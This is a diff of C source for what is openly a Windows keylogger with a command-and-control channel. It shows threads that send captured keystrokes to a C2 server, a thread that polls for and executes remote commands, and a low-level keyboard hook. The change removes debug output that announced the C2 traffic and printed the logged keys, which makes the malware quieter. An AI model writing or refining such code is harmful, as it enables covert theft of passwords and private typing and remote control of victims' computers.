@@ -113,7 +113,6 @@ RET_CODE startThreads() {
     HANDLE threads[2] = { ctx->hWriteThread, ctx->hCmdThread };
     WaitForMultipleObjects(2, threads, TRUE, INFINITE);
 
-    printf("Threads complete!\n");
     return R_SUCCESS;
 }
 
@@ -130,10 +129,6 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
     while (!ctx->shutdown) {
         Sleep(SLP_WRITER_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
-
-#if 1
-        printf("Writing logs to C2...\n\n");
-#endif
 
         // skip the write if the buffer is empty
         if (ctx->kLogger->bufferPtr == 0) { goto skipWrite; }
@@ -162,16 +157,9 @@ DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
         Sleep(SLP_CMD_THREAD);
         WaitForSingleObject(ctx->hMutexThreadSync, INFINITE);
 
-#if 1
-        printf("Polling cmds from C2...\n\n");
-#endif
-
         RET_CODE ret = pollCommandsAndBeacon(ctx->client);
         // only execute the commands if there is something to exec
-        if (ret != R_SUCCESS) {
-            printRetCode(ret);
-            goto skipCmds;
-        }
+        if (ret != R_SUCCESS) { goto skipCmds; }
         
         ret = processCommands(ctx->client);
         switch (ret) {
@@ -227,10 +215,6 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (ret == R_FULL_BUFF) { 
         // did not implement double and copy logic :(
     }
-
-#if 1  // print out the key log for testing
-    printf("%s\n", ctx->kLogger->keyBuffer);
-#endif
 
     return CallNextHookEx(ctx->hLowLevelKeyHook, nCode, wParam, lParam);
 }
